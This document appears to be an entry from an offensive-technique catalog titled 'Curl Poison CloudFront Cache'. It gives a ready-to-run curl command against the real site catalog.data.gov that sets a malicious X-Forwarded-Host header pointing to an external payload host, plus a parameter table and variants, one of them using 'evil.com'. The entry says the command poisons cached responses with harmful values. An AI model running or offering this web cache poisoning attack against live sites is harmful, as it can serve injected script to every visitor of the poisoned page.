---
data: >-
  curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip,
  deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0
  (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H
  'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?'
  -H 'Connection: close'
  'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6'
  > /dev/null
tags:
  - cache-poisoning
  - http-request
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 4fa7ca71-b3f6-467f-a01e-10e97d9aba05
created_at: '2025-12-13T09:00:34.667Z'
updated_at: '2025-12-13T09:00:34.667Z'
verified: false
validated: true
submitted: true
---
# Curl Poison CloudFront Cache

## Command

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

## Description

Sends a GET request to poison the CloudFront cache with a malicious X-Forwarded-Host header, used in web cache poisoning attacks to inject harmful values into cached responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP headers in the output | No |
| `-s` | Silent mode, suppress progress meter | No |
| `-k` | Allow insecure SSL connections | Yes |
| `-X 'GET'` | Specify request method as GET | Yes |
| `-H 'Host: catalog.data.gov'` | Set Host header | Yes |
| `-H 'Accept-Encoding: gzip, deflate'` | Set accepted encodings | No |
| `-H 'Accept: */*'` | Set Accept header to any | No |
| `-H 'Accept-Language: en'` | Set language to English | No |
| `-H 'User-Agent: ...'` | Set User-Agent to mimic IE9 | No |
| `-H 'x-forwarded-host: ...'` | Set malicious X-Forwarded-Host | Yes |
| `-H 'Connection: close'` | Close connection after request | No |
| `> /dev/null` | Redirect output to null device | No |

## Examples

### Basic Usage

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'x-forwarded-host: evil.com' 'https://catalog.data.gov/somepath'
```

### Advanced Usage

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'User-Agent: Custom' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

## Expected Output

No output due to redirection, but successful cache poisoning if the request completes without errors.

## Related

- [[procedures/Poison-CloudFront-Cache-with-Malicious-X-Forwarded-Host]]
